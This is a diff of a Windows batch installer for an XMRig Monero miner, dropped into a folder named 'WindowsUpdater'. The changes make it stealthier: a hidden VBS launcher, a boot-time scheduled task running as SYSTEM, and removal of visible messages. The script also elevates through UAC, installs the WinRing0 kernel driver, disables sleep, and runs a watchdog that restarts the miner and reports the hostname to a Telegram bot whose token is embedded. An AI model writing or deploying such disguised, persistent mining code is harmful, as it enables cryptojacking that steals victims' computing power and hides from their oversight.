@@ -7,7 +7,7 @@ REM ====================================================================
 REM Ultimate Monero Miner - High Mid-End Edition
 REM Optimized for 14-core CPUs with 16GB RAM (e.g., Intel i5-14400)
 REM Installs to C:\ProgramData\WindowsUpdater as requested
-REM Includes Telegram alert support
+REM Includes Telegram alert support + silent watchdog
 REM ====================================================================
 setlocal enableextensions enabledelayedexpansion
 
@@ -28,13 +28,10 @@ REM === Telegram Bot (for alerts) ===
 set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
 set "TG_CHAT_ID=8112985977"
 
-REM === One-Time Admin Enforcement ===
-echo [*] Checking for admin privileges...
+REM === Admin Privileges Check ===
 echo [*] Checking for admin privileges... >> "%temp%\miner_debug.log"
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' neq '0' (
-    echo [!] Admin privileges not detected. Attempting to elevate...
-    echo [!] Admin privileges not detected. Attempting to elevate... >> "%temp%\miner_debug.log"
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
     echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
     "%temp%\elevate.vbs"
@@ -42,42 +39,39 @@ if '%errorlevel%' neq '0' (
     exit /b
 )
 echo [✔] Running with admin privileges.
-echo [✔] Running with admin privileges. >> "%temp%\miner_debug.log"
 
+REM === Banner ===
 echo ===============================
 echo Starting Monero Miner on High Mid-End PC
 echo ===============================
-
 echo [*] Initial setup complete. Press any key to continue...
 pause
 
-REM === Clean Up Existing Task and MSR Driver ===
+REM === Cleanup ===
 schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
 sc stop WinRing0_1_2_0 >nul 2>&1
 sc delete WinRing0_1_2_0 >nul 2>&1
 
-REM === MSR Driver Installation (With Fallback) ===
+REM === MSR Driver Install ===
 if exist "%SRC%\winring0x64.sys" (
     sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
     sc start WinRing0_1_2_0
 )
 
-REM === System Optimization ===
+REM === Power Settings ===
 powercfg /change standby-timeout-ac 0
 powercfg /change standby-timeout-dc 0
 powercfg /hibernate off
 powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCIDLE 0
 powercfg /setactive SCHEME_CURRENT
 
-REM === CPU Core Detection ===
+REM === Detect CPU Cores ===
 set "AFFINITY_MASK="
 for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do (
     set /a "CORES=%%A"
     set /a "AFFINITY_MASK=(1<<%%A)-1"
 )
-if not defined AFFINITY_MASK (
-    set "AFFINITY_MASK=63"
-)
+if not defined AFFINITY_MASK set "AFFINITY_MASK=63"
 
 REM === Auto-Update Miner ===
 set "URL="
@@ -95,11 +89,11 @@ if defined URL (
     )
 )
 
-REM === Install Files ===
+REM === Copy Files ===
 if not exist "%DEST%" mkdir "%DEST%"
 xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul
 
-REM === Generate Watchdog Script with Telegram Support ===
+REM === Create run_watchdog.bat ===
 (
   echo @echo off
   echo setlocal enabledelayedexpansion
@@ -111,38 +105,40 @@ REM === Generate Watchdog Script with Telegram Support ===
   echo set "ALGO=rx/0"
   echo set "TG_TOKEN=%TG_TOKEN%"
   echo set "TG_CHAT_ID=%TG_CHAT_ID%"
-  echo if exist "%%MUTEX_FILE%%" (
-  echo     echo [!] Watchdog already running. Exiting.
+  echo if exist "%%MUTEX_FILE%%" ^(
   echo     exit /b
-  echo )
+  echo ^)
   echo echo locked ^> "%%MUTEX_FILE%%"
   echo :loop
   echo tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe" ^>nul
-  echo if errorlevel 1 (
-  echo     echo [*] XMRig not running. Launching miner...
+  echo if errorlevel 1 ^(
   echo     start /min "" "%%XMRIG_PATH%%" -o %%POOL%% -u %%WALLET%% -p %%PASSWORD%% -a %%ALGO%% -k --donate-level=0 --randomx-1gb-pages --threads=auto --cpu-priority=3 --max-cpu-usage=90 --print-time=60
-  echo     curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" -d "chat_id=!TG_CHAT_ID!" -d "text=[ALERT] XMRig was restarted on !COMPUTERNAME!"
-  echo ) else (
-  echo     echo [✔] XMRig is running. Checking again in 30 seconds...
-  echo )
+  echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT_ID%%" -d "text=[⚠️ ALERT] XMRig restarted on %%COMPUTERNAME%% at %%date%% %%time%%"
+  echo ^) else ^(
+  echo     rem Miner running
+  echo ^)
   echo timeout /t 30 ^>nul
   echo goto loop
 ) > "%DEST%\run_watchdog.bat"
 
-REM === Permanent Auto-Start ===
+REM === Create Silent VBS Launcher ===
+echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\run_silent.vbs"
+echo WshShell.Run "%DEST%\run_watchdog.bat", 0, False >> "%DEST%\run_silent.vbs"
+
+REM === Create Task for Silent Startup ===
 schtasks /create /tn "%TASK_NAME%" ^
-  /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
+  /tr "wscript.exe \"%DEST%\run_silent.vbs\"" ^
   /sc onstart ^
   /ru SYSTEM ^
   /rl HIGHEST ^
   /f
 
-REM === Launch Watchdog Immediately ===
-start "" /min "%DEST%\run_watchdog.bat"
+REM === Launch Watchdog Now ===
+wscript.exe "%DEST%\run_silent.vbs"
 
-echo [✔] Miner installed (optimized for high mid-end PC)
+echo [✔] Miner installed (silent watchdog mode)
 echo CPU Affinity: !AFFINITY_MASK!
 echo Logs: %LOG_FILE%
 echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
-echo [✔] Miner installed at %date% %time% >> "%temp%\miner_debug.log"
+echo [✔] Setup completed at %date% %time% >> "%temp%\miner_debug.log"
 pause
